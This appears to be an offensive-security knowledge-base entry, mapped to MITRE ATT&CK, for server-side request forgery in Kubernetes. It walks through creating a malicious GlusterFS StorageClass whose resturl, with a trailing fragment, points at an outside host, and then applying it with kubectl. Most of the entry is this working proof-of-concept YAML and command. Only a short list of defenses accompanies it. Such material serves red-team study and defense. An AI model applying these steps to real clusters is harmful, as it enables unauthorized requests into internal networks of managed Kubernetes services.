---
id: proc-k8s-malicious-sc
tags:
  - ssrf
  - kubernetes
  - storageclass
type: procedure
tools:
  - '[[tools/kubectl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/kubectl-create-yaml]]'
verified: false
platforms:
  - Kubernetes
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:54.849Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
---

# Create-Malicious-StorageClass-for-SSRF

## Summary

This procedure creates a custom Kubernetes StorageClass using vulnerable provisioners like GlusterFS, manipulating the resturl parameter with a URL fragment to enable SSRF by truncating the appended path in the client code.

## Description

In Kubernetes, the kube-controller-manager handles dynamic provisioning for StorageClasses. The GlusterFS Go client (heketi/client/api/go-client/volume.go#L34) appends '/volumes' to the user-supplied resturl without validating fragments, allowing attackers to control the full URL. This is exploitable in managed clusters where provisioning occurs from the internal network. Prerequisites include cluster access to create StorageClasses.

## Requirements

1. kubectl access with permissions to create StorageClasses (e.g., cluster-admin role)
2. YAML file prepared with malicious resturl (e.g., http://attacker.com:6666/#)
3. Target provisioner enabled (GlusterFS, ScaleIO, or StorageOS)

## Defense

Defensive measures and detection strategies:

- Validate and allowlist resturl parameters in StorageClass definitions
- Disable or restrict custom provisioners in managed clusters
- Monitor kube-controller-manager logs for anomalous provisioning requests

## Objectives

1. Establish control over provisioning endpoint for SSRF
2. Bypass path appending via URL fragment
3. Set up for PVC-triggered internal requests

## Instructions

### Step 1: Prepare Malicious YAML

**Context**: Define the StorageClass YAML with required parameters and malicious resturl.

**Command** ([[commands/kubectl-create-yaml]]):
```bash
# Example sc-poc.yaml content:
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
  name: poc-ssrf
provisioner: kubernetes.io/glusterfs
parameters:
  resturl: "http://bzh.ovh:6666/#"
  clusterid: "mycluster"
  restauthenabled: "false"
  gidMin: "40000"
  gidMax: "50000"
  volumetype: "replica 3"
reclaimPolicy: Delete
```

> This YAML sets resturl to truncate '/volumes', allowing arbitrary URL. Save as sc-poc.yaml.

### Step 2: Apply the StorageClass

**Context**: Create the resource to register the malicious configuration.

**Command** ([[commands/kubectl-create-yaml]]):
```bash
kubectl create -f sc-poc.yaml
```

> Expected output: storageclass/poc-ssrf created. Verify with `kubectl get sc`.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/kubectl-create-yaml]]

## Tools Used

- [[tools/kubectl]]

## Tags

- ssrf
- kubernetes
- storageclass

---
